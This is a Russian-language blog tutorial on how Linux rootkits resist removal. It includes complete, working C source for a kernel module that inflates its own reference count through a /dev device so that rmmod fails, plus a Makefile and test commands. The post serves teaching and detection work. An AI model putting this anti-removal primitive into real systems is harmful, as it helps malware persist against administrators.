---
title: "Изменение счетчика ссылок LKM"
date: 2026-02-26
categories: [linux]
tags: [lkm, kernel, rootkit, detection, refcount]
tagline: "Удали если сможешь..."
header:
  overlay_image: /assets/images/linux/LKM-refcount-change/header.jpeg
  overlay_filter: 0.5
  overlay_color: "#fff"
classes: half
layout: single
toc: true
toc_sticky: true
toc_label: "Оглавление"
---

# Изменение счетчика ссылок

**Привет^3**

В предыдущих постах мы узнали, что такое `LKM` и как с ним работать:
* [Простые LKM](https://cu63.github.io/linux/simple-lkm/)
* [Драйверы файловых устройств](https://cu63.github.io/linux/security/file-divice-driver/)

Наконец пришло время перейти к разбору техник, которые используют руткиты. Сегодня я покажу, как руткиты защищают себя от удаления.

Техника достаточно простая, так что текущих знаний должно хватить, чтобы ее понять.

## `struct module`

Каждый модуль ядра описывается структурой [`struct module`](https://elixir.bootlin.com/linux/v5.17.5/source/include/linux/module.h#L365).
Она достаточно большая, но сегодня нас интересуют только некоторые поля:

```c
struct module {
	struct list head;
	char name[MODULE_NAME_LEN];
	atomic_t refcnt;

	...
};
```

Где:

* `name` — уникальное имя `LKM`;
* `refcnt` — счетчик ссылок на модуль ядра.

## Подробнее про счетчик ссылок

Счетчик увеличивается каждый раз, когда происходит обращение к модулю, например:

* `open()` символьного устройства;
* загрузка зависимого модуля;
* вызов экспортированной функции;
* обращение через `try_module_get()`.

Уменьшается он при:

* `close()`;
* завершении работы пользователя;
* вызове `module_put()`.

Почему это важно?

Для удаления модуля вызывается системный вызов [`delete_module`](https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module.c#L912).
В процессе удаления вызывается функция [`try_stop_module`](https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module.c#L961):

```c
static int try_stop_module(struct module *mod, int flags, int *forced)
{
	if (try_release_module_ref(mod) != 0) {
		*forced = try_force_unload(flags);
		if (!(*forced))
			return -EWOULDBLOCK;
	}

	mod->state = MODULE_STATE_GOING;

	return 0;
}
```

Если модуль используется (refcount не равен нулю), ядро вернет `-EWOULDBLOCK`.
Проще говоря — пока модуль “занят”, его удалить нельзя.

И вот здесь начинается самое интересное.

## Изменение счетчика `refcnt`

За основу возьму `chardev.c` из прошлой статьи.
Файловые устройства удобно использовать для управления `LKM`.

Вот функция изменения счетчика:

```c
static void change_refcount(void) {
	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
	int old_val;

	do {
		old_val = atomic_read(p_ref_count);
		if (old_val > 1) {
			if (atomic_cmpxchg(p_ref_count, old_val, 1) == old_val) {
				pr_info("Reset ref count from %d to 1\n", old_val);
				break;
			}
		} else {
			if (atomic_cmpxchg(p_ref_count, old_val, 0x8163) == old_val) {
				pr_info("Set ref count to 0x8163\n");
				break;
			}
		}
	} while (1);
}
```

При каждом открытии `/dev/refcount_changer` будет меняться значение `refcnt`.
Таким образом можно “включать” и “выключать” защиту модуля.

## Полный код модуля

`refcount_changer.c`:

```c
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

static void change_refcount(void);

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);

#define SUCCESS 0
#define DEVICE_NAME "refcount_changer"

static int major;
static struct class *cls;

static const struct file_operations chardev_fops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static int __init chardev_init(void) {
	major = register_chrdev(0, DEVICE_NAME, &chardev_fops);
	if (major < 0) {
		pr_alert("Registering char device failed with %d\n", major);
		return major;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
	cls = class_create(DEVICE_NAME);
#else
	cls = class_create(THIS_MODULE, DEVICE_NAME);
#endif

	if (IS_ERR(cls)) {
		unregister_chrdev(major, DEVICE_NAME);
		return PTR_ERR(cls);
	}

	device_create(cls, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
	pr_info("Device created on /dev/%s\n", DEVICE_NAME);
	return SUCCESS;
}

static void __exit chardev_exit(void) {
	device_destroy(cls, MKDEV(major, 0));
	class_destroy(cls);
	unregister_chrdev(major, DEVICE_NAME);
}

module_init(chardev_init);
module_exit(chardev_exit);

static void change_refcount(void) {
	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
	int old_val;

	do {
		old_val = atomic_read(p_ref_count);
		if (old_val > 1) {
			if (atomic_cmpxchg(p_ref_count, old_val, 1) == old_val) {
				pr_info("Reset ref count from %d to 1\n", old_val);
				break;
			}
		} else {
			if (atomic_cmpxchg(p_ref_count, old_val, 0x8163) == old_val) {
				pr_info("Set ref count to 0x8163\n");
				break;
			}
		}
	} while (1);
}

static int device_open(struct inode *inode, struct file *file) {
	change_refcount();
	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
	return SUCCESS;
}

static ssize_t device_read(struct file *filp,
			   char __user *buffer,
			   size_t length,
			   loff_t *offset) {
	return 0;
}

static ssize_t device_write(struct file *filp,
			    const char __user *buff,
			    size_t len,
			    loff_t *off) {
	return -EINVAL;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cu63");
```

## Makefile

```bash
NAME := refcount_changer
obj-m += $(NAME).o
VER := $(shell uname -r)

all:
	make -C /lib/modules/$(VER)/build M=$(shell pwd) modules

clean:
	make -C /lib/modules/$(VER)/build M=$(shell pwd) clean
```

## Проверка

```bash
sudo insmod refcount_changer.ko
sudo cat /dev/refcount_changer
sudo rmmod refcount_changer
```

Если `refcnt` завышен, модуль удалить не получится:

```
rmmod: ERROR: Module refcount_changer is in use
```

## Вывод

Механизм выгрузки модуля в Linux напрямую зависит от `refcnt`.
Пока счетчик ссылок больше нуля, ядро отказывается удалять модуль.

Это позволяет руткитам использовать изменение `refcnt` как примитивную защиту от удаления: модуль формально остается “занятым” и не может быть выгружен стандартными средствами.

Высокий `refcount` может выглядеть подозрительно, но сам по себе он не является надежным индикатором компрометации. Легитимные модули тоже могут иметь высокий `refcnt`, а злоумышленник может выбрать значение, не выбивающееся из нормы.

А чаще всего мы вовсе не видим эти модули.
Но об этом поговорим в следующей статье.
